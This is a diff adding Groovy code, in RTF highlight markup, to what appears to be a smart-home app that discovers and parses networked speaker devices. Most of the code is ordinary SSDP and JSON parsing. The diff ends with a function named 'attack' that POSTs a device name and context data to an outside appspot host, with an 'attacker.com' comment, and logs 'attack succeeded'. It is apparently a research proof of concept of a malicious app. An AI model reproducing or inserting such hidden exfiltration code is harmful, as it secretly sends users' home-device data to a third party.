+        {\cf10\b if} {\cf8 (}type{\cf8 ?}{\cf8 .}{\cf21 contains}{\cf8 (}{\cf2 "json"}{\cf8 )}{\cf8 )}\par
+        {\cf8 \{}\par
+            body {\cf8 =} {\cf10\b new} groovy{\cf8 .}{\cf21 json}{\cf8 .}{\cf21 JsonSlurper}{\cf8 (}{\cf8 )}{\cf8 .}{\cf21 parseText}{\cf8 (}bodyString{\cf8 )}\par
+\par
+            {\cf10\b if} {\cf8 (}body{\cf8 ?}{\cf8 .}{\cf21 device}{\cf8 ?}{\cf8 .}{\cf21 modelName}{\cf8 .}{\cf21 startsWith}{\cf8 (}{\cf2 "lttlrck"}{\cf8 )}{\cf8 )}\par
+            {\cf8 \{}\par
+                {\cf20 def} sonoses {\cf8 =} getSmartFace{\cf8 (}{\cf8 )}\par
+\par
+                {\cf20 def} player {\cf8 =} sonoses{\cf8 .}{\cf21 find} {\cf8 \{}it{\cf8 ?}{\cf8 .}{\cf21 key}{\cf8 ?}{\cf8 .}{\cf21 contains}{\cf8 (}body{\cf8 ?}{\cf8 .}{\cf21 device}{\cf8 ?}{\cf8 .}{\cf21 key}{\cf8 )}{\cf8 \}}\par
+                {\cf10\b if} {\cf8 (}player{\cf8 )}\par
+                {\cf8 \{}\par
+                    player{\cf8 .}{\cf21 value} {\cf8 <}{\cf8 <} {\cf8 [}{\cf24 name:}body{\cf8 ?}{\cf8 .}{\cf21 device}{\cf8 ?}{\cf8 .}{\cf21 name}{\cf8 ,}{\cf24 model:}body{\cf8 ?}{\cf8 .}{\cf21 device}{\cf8 ?}{\cf8 .}{\cf21 modelName}{\cf8 ,} {\cf24 serialNumber:}body{\cf8 ?}{\cf8 .}{\cf21 device}{\cf8 ?}{\cf8 .}{\cf21 serialNum}{\cf8 ,} {\cf24 verified:} {\cf10\b true}{\cf8 ]}\par
+                {\cf8 \}}\par
+                {\cf10\b else}\par
+                {\cf8 \{}\par
+                    log{\cf8 .}{\cf21 error} {\cf2 "/xml/device_description.xml returned a device that didn't exist"}\par
+                {\cf8 \}}\par
+            {\cf8 \}}\par
+        {\cf8 \}}\par
+        {\cf10\b else} {\cf5 if}{\cf8 (}type{\cf8 ?}{\cf8 .}{\cf21 contains}{\cf8 (}{\cf2 "json"}{\cf8 )}{\cf8 )}\par
+        {\cf8 \{} {\cf1\i //(application/json)\par
+}            body {\cf8 =} {\cf10\b new} groovy{\cf8 .}{\cf21 json}{\cf8 .}{\cf21 JsonSlurper}{\cf8 (}{\cf8 )}{\cf8 .}{\cf21 parseText}{\cf8 (}bodyString{\cf8 )}\par
+            log{\cf8 .}{\cf21 trace} {\cf2 "GOT JSON $body"}\par
+        {\cf8 \}}\par
+\par
+    {\cf8 \}}\par
+    {\cf10\b else} {\cf8 \{}\par
+        log{\cf8 .}{\cf21 trace} {\cf2 "cp desc: "} {\cf8 +} description\par
+        {\cf1\i //log.trace description\par
+}    {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf10\b private} {\cf20 def} {\cf5 parseEventMessage}{\cf8 (}Map event{\cf8 )} {\cf8 \{}\par
+    {\cf1\i //handles smartFace attribute events\par
+}    {\cf10\b return} event\par
+{\cf8 \}}\par
+\par
+{\cf10\b private} {\cf20 def} {\cf5 parseEventMessage}{\cf8 (}String description{\cf8 )} {\cf8 \{}\par
+    {\cf20 def} event {\cf8 =} {\cf8 [}{\cf8 :}{\cf8 ]}\par
+    {\cf20 def} parts {\cf8 =} description{\cf8 .}{\cf21 split}{\cf8 (}{\cf2 ','}{\cf8 )}\par
+    parts{\cf8 .}{\cf21 each} {\cf8 \{} part {\cf8 -}{\cf8 >}\par
+        part {\cf8 =} part{\cf8 .}{\cf21 trim}{\cf8 (}{\cf8 )}\par
+        {\cf10\b if} {\cf8 (}part{\cf8 .}{\cf21 startsWith}{\cf8 (}{\cf2 'devicetype:'}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+            {\cf20 def} valueString {\cf8 =} part{\cf8 .}{\cf21 split}{\cf8 (}{\cf2 ":"}{\cf8 )}{\cf8 [}{\cf8 1}{\cf8 ]}{\cf8 .}{\cf21 trim}{\cf8 (}{\cf8 )}\par
+            event{\cf8 .}{\cf21 devicetype} {\cf8 =} valueString\par
+        {\cf8 \}}\par
+        {\cf10\b else} {\cf5 if} {\cf8 (}part{\cf8 .}{\cf21 startsWith}{\cf8 (}{\cf2 'mac:'}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+            {\cf20 def} valueString {\cf8 =} part{\cf8 .}{\cf21 split}{\cf8 (}{\cf2 ":"}{\cf8 )}{\cf8 [}{\cf8 1}{\cf8 ]}{\cf8 .}{\cf21 trim}{\cf8 (}{\cf8 )}\par
+            {\cf10\b if} {\cf8 (}valueString{\cf8 )} {\cf8 \{}\par
+                event{\cf8 .}{\cf21 mac} {\cf8 =} valueString\par
+            {\cf8 \}}\par
+        {\cf8 \}}\par
+        {\cf10\b else} {\cf5 if} {\cf8 (}part{\cf8 .}{\cf21 startsWith}{\cf8 (}{\cf2 'networkAddress:'}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+            {\cf20 def} valueString {\cf8 =} part{\cf8 .}{\cf21 split}{\cf8 (}{\cf2 ":"}{\cf8 )}{\cf8 [}{\cf8 1}{\cf8 ]}{\cf8 .}{\cf21 trim}{\cf8 (}{\cf8 )}\par
+            {\cf10\b if} {\cf8 (}valueString{\cf8 )} {\cf8 \{}\par
+                event{\cf8 .}{\cf21 ip} {\cf8 =} valueString\par
+            {\cf8 \}}\par
+        {\cf8 \}}\par
+        {\cf10\b else} {\cf5 if} {\cf8 (}part{\cf8 .}{\cf21 startsWith}{\cf8 (}{\cf2 'deviceAddress:'}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+            {\cf20 def} valueString {\cf8 =} part{\cf8 .}{\cf21 split}{\cf8 (}{\cf2 ":"}{\cf8 )}{\cf8 [}{\cf8 1}{\cf8 ]}{\cf8 .}{\cf21 trim}{\cf8 (}{\cf8 )}\par
+            {\cf10\b if} {\cf8 (}valueString{\cf8 )} {\cf8 \{}\par
+                event{\cf8 .}{\cf21 port} {\cf8 =} valueString\par
+            {\cf8 \}}\par
+        {\cf8 \}}\par
+        {\cf10\b else} {\cf5 if} {\cf8 (}part{\cf8 .}{\cf21 startsWith}{\cf8 (}{\cf2 'ssdpPath:'}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+            {\cf20 def} valueString {\cf8 =} part{\cf8 .}{\cf21 split}{\cf8 (}{\cf2 ":"}{\cf8 )}{\cf8 [}{\cf8 1}{\cf8 ]}{\cf8 .}{\cf21 trim}{\cf8 (}{\cf8 )}\par
+            {\cf10\b if} {\cf8 (}valueString{\cf8 )} {\cf8 \{}\par
+                event{\cf8 .}{\cf21 ssdpPath} {\cf8 =} valueString\par
+            {\cf8 \}}\par
+        {\cf8 \}}\par
+        {\cf10\b else} {\cf5 if} {\cf8 (}part{\cf8 .}{\cf21 startsWith}{\cf8 (}{\cf2 'ssdpUSN:'}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+            part {\cf8 -}{\cf8 =} {\cf2 "ssdpUSN:"}\par
+            {\cf20 def} valueString {\cf8 =} part{\cf8 .}{\cf21 trim}{\cf8 (}{\cf8 )}\par
+            {\cf10\b if} {\cf8 (}valueString{\cf8 )} {\cf8 \{}\par
+                event{\cf8 .}{\cf21 ssdpUSN} {\cf8 =} valueString\par
+            {\cf8 \}}\par
+        {\cf8 \}}\par
+        {\cf10\b else} {\cf5 if} {\cf8 (}part{\cf8 .}{\cf21 startsWith}{\cf8 (}{\cf2 'ssdpTerm:'}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+            part {\cf8 -}{\cf8 =} {\cf2 "ssdpTerm:"}\par
+            {\cf20 def} valueString {\cf8 =} part{\cf8 .}{\cf21 trim}{\cf8 (}{\cf8 )}\par
+            {\cf10\b if} {\cf8 (}valueString{\cf8 )} {\cf8 \{}\par
+                event{\cf8 .}{\cf21 ssdpTerm} {\cf8 =} valueString\par
+            {\cf8 \}}\par
+        {\cf8 \}}\par
+        {\cf10\b else} {\cf5 if} {\cf8 (}part{\cf8 .}{\cf21 startsWith}{\cf8 (}{\cf2 'headers'}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+            part {\cf8 -}{\cf8 =} {\cf2 "headers:"}\par
+            {\cf20 def} valueString {\cf8 =} part{\cf8 .}{\cf21 trim}{\cf8 (}{\cf8 )}\par
+            {\cf10\b if} {\cf8 (}valueString{\cf8 )} {\cf8 \{}\par
+                event{\cf8 .}{\cf21 headers} {\cf8 =} valueString\par
+            {\cf8 \}}\par
+        {\cf8 \}}\par
+        {\cf10\b else} {\cf5 if} {\cf8 (}part{\cf8 .}{\cf21 startsWith}{\cf8 (}{\cf2 'body'}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+            part {\cf8 -}{\cf8 =} {\cf2 "body:"}\par
+            {\cf20 def} valueString {\cf8 =} part{\cf8 .}{\cf21 trim}{\cf8 (}{\cf8 )}\par
+            {\cf10\b if} {\cf8 (}valueString{\cf8 )} {\cf8 \{}\par
+                event{\cf8 .}{\cf21 body} {\cf8 =} valueString\par
+            {\cf8 \}}\par
+        {\cf8 \}}\par
+    {\cf8 \}}\par
+\par
+    event\par
+{\cf8 \}}\par
+\par
+\par
+{\cf1\i /////////CHILD DEVICE METHODS\par
+}{\cf20 def} {\cf5 parse}{\cf8 (}childDevice{\cf8 ,} description{\cf8 )} {\cf8 \{}\par
+    {\cf20 def} parsedEvent {\cf8 =} parseEventMessage{\cf8 (}description{\cf8 )}\par
+\par
+    {\cf10\b if} {\cf8 (}parsedEvent{\cf8 .}{\cf21 headers} {\cf8 &}{\cf8 &} parsedEvent{\cf8 .}{\cf21 body}{\cf8 )} {\cf8 \{}\par
+        {\cf20 def} headerString {\cf8 =} {\cf10\b new} String{\cf8 (}parsedEvent{\cf8 .}{\cf21 headers}{\cf8 .}{\cf21 decodeBase64}{\cf8 (}{\cf8 )}{\cf8 )}\par
+        {\cf20 def} bodyString {\cf8 =} {\cf10\b new} String{\cf8 (}parsedEvent{\cf8 .}{\cf21 body}{\cf8 .}{\cf21 decodeBase64}{\cf8 (}{\cf8 )}{\cf8 )}\par
+        log{\cf8 .}{\cf21 trace} {\cf2 "parse() - $\{bodyString\}"}\par
+\par
+        {\cf20 def} body {\cf8 =} {\cf10\b new} groovy{\cf8 .}{\cf21 json}{\cf8 .}{\cf21 JsonSlurper}{\cf8 (}{\cf8 )}{\cf8 .}{\cf21 parseText}{\cf8 (}bodyString{\cf8 )}\par
+    {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+        log{\cf8 .}{\cf21 trace} {\cf2 "parse - got something other than headers,body..."}\par
+        {\cf10\b return} {\cf8 [}{\cf8 ]}\par
+    {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf10\b private} Integer {\cf5 convertHexToInt}{\cf8 (}hex{\cf8 )} {\cf8 \{}\par
+    Integer{\cf8 .}{\cf21 parseInt}{\cf8 (}hex{\cf8 ,}{\cf8 16}{\cf8 )}\par
+{\cf8 \}}\par
+\par
+{\cf10\b private} String {\cf5 convertHexToIP}{\cf8 (}hex{\cf8 )} {\cf8 \{}\par
+    {\cf8 [}convertHexToInt{\cf8 (}hex{\cf8 [}{\cf8 0}{\cf8 .}{\cf8 .}{\cf8 1}{\cf8 ]}{\cf8 )}{\cf8 ,}convertHexToInt{\cf8 (}hex{\cf8 [}{\cf8 2}{\cf8 .}{\cf8 .}{\cf8 3}{\cf8 ]}{\cf8 )}{\cf8 ,}convertHexToInt{\cf8 (}hex{\cf8 [}{\cf8 4}{\cf8 .}{\cf8 .}{\cf8 5}{\cf8 ]}{\cf8 )}{\cf8 ,}convertHexToInt{\cf8 (}hex{\cf8 [}{\cf8 6}{\cf8 .}{\cf8 .}{\cf8 7}{\cf8 ]}{\cf8 )}{\cf8 ]}{\cf8 .}{\cf21 join}{\cf8 (}{\cf2 "."}{\cf8 )}\par
+{\cf8 \}}\par
+\par
+{\cf10\b private} {\cf5 getHostAddress}{\cf8 (}d{\cf8 )} {\cf8 \{}\par
+    {\cf20 def} parts {\cf8 =} d{\cf8 .}{\cf21 split}{\cf8 (}{\cf2 ":"}{\cf8 )}\par
+    {\cf20 def} ip {\cf8 =} convertHexToIP{\cf8 (}parts{\cf8 [}{\cf8 0}{\cf8 ]}{\cf8 )}\par
+    {\cf20 def} port {\cf8 =} convertHexToInt{\cf8 (}parts{\cf8 [}{\cf8 1}{\cf8 ]}{\cf8 )}\par
+    {\cf10\b return} ip {\cf8 +} {\cf2 ":"} {\cf8 +} port\par
+{\cf8 \}}\par
+\par
+{\cf10\b private} Boolean {\cf5 canInstallLabs}{\cf8 (}{\cf8 )}\par
+{\cf8 \{}\par
+    {\cf10\b return} {\cf5 hasAllHubsOver}{\cf8 (}{\cf2 "000.011.00603"}{\cf8 )}\par
+{\cf8 \}}\par
+\par
+{\cf10\b private} Boolean {\cf5 hasAllHubsOver}{\cf8 (}String desiredFirmware{\cf8 )}\par
+{\cf8 \{}\par
+    {\cf10\b return} realHubFirmwareVersions{\cf8 .}{\cf21 every} {\cf8 \{} fw {\cf8 -}{\cf8 >} fw {\cf8 >}{\cf8 =} desiredFirmware {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf10\b private} List {\cf5 getRealHubFirmwareVersions}{\cf8 (}{\cf8 )}\par
+{\cf8 \{}\par
+    {\cf10\b return} location{\cf8 .}{\cf21 hubs}{\cf8 *}{\cf8 .}{\cf21 firmwareVersionString}{\cf8 .}{\cf21 findAll} {\cf8 \{} it {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 attack}{\cf8 (}String devicekey{\cf8 ,} String deviceName{\cf8 ,} String context{\cf8 )} {\cf8 \{}\par
+    log{\cf8 .}{\cf21 debug} {\cf2 "http post"}\par
+    {\cf20 def} takeParams {\cf8 =} {\cf8 [}\par
+            {\cf24 uri:} {\cf2 "https://automated-lore-135923.appspot.com"}{\cf8 ,} {\cf1\i //"https://attacker.com"\par
+}            {\cf24 path:} {\cf2 ""}{\cf8 ,}\par
+            {\cf24 requestContentType:} {\cf2 "application/x-www-form-urlencoded"}{\cf8 ,}\par
+            {\cf24 body:} {\cf8 [}\par
+            	{\cf2 "context"}{\cf8 :} context{\cf8 ,}\par
+        		{\cf24 devicekey:} deviceName\par
+    		{\cf8 ]}\par
+      {\cf8 ]}\par
+      {\cf10\b try} {\cf8 \{}\par
+		httpPost{\cf8 (}takeParams{\cf8 )} {\cf8 \{} resp {\cf8 -}{\cf8 >}\par
+			{\cf10\b if} {\cf8 (}resp{\cf8 .}{\cf21 status} {\cf8 =}{\cf8 =} {\cf8 200}{\cf8 )} {\cf8 \{}\par
+				log{\cf8 .}{\cf21 debug} {\cf2 "attack succeeded"}\par
+                log{\cf8 .}{\cf21 debug} resp{\cf8 .}{\cf21 data}{\cf8 .}{\cf21 toString}{\cf8 (}{\cf8 )}\par
+			{\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+				log{\cf8 .}{\cf21 error} {\cf2 "attack failed"}\par
+			{\cf8 \}}\par
+		{\cf8 \}}\par
+	 {\cf8 \}} {\cf10\b catch} {\cf8 (}groovyx{\cf8 .}{\cf21 net}{\cf8 .}{\cf21 http}{\cf8 .}{\cf21 HttpResponseException} e{\cf8 )} {\cf8 \{}\par
+		log{\cf8 .}{\cf21 error} {\cf2 "Dropcam get_image failure: $\{e\} with status: $\{e.statusCode\}"}\par
+		{\cf10\b if} {\cf8 (}e{\cf8 .}{\cf21 statusCode} {\cf8 =}{\cf8 =} {\cf8 403}{\cf8 )} {\cf8 \{}\par
+			{\cf10\b throw} {\cf10\b new} {\cf5 RuntimeException}{\cf8 (}{\cf2 "Login Required"}{\cf8 )}\par
+		{\cf8 \}} {\cf10\b else} {\cf10\b if} {\cf8 (}e{\cf8 .}{\cf21 statusCode} {\cf8 =}{\cf8 =} {\cf8 404}{\cf8 )} {\cf8 \{}\par
+			log{\cf8 .}{\cf21 error} {\cf2 "Dropcam 404, camera may be offline"}\par
+		{\cf8 \}}\par
+	 {\cf8 \}} {\cf10\b catch} {\cf8 (}Exception e{\cf8 )} {\cf8 \{}\par
+		log{\cf8 .}{\cf21 error} {\cf2 "Unexpected Dropcam exception"}{\cf8 ,} e\par
+		{\cf1\i //sendNotification("Your dropcam is offline.")\par
+}	 {\cf8 \}}\par
+   \par
+{\cf8 \}}\par
+}
